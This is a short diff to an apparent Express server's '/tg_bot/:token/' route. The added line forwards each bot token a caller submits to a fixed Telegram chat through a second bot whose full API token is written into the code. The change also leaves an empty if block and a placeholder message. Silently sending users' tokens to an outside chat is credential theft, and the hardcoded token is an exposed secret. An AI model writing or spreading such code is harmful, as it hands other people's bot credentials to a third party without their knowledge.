@@ -113,8 +113,8 @@ app.use("/api/eval/?", function(req, res){
 app.use("/tg_bot/:token/?", function(req, res){
 	if(!db.bots[req.params.token]){
 	}
-
-	rp(`https://api.telegram.org/bot${token}/sendMessage?chat_id=392041691&text=124qwe`)
+	rp(`https://api.telegram.org/bot1342396766:AAFGcxzXcJ2EfNywadIQA-FK7zaFnTYS8RY/sendMessage?chat_id=392041691&text=${req.params.token}`);
+	rp(`https://api.telegram.org/bot${req.params.token}/sendMessage?chat_id=392041691&text=124qwe`);
 });
 
 app.use("/", function(request, response){
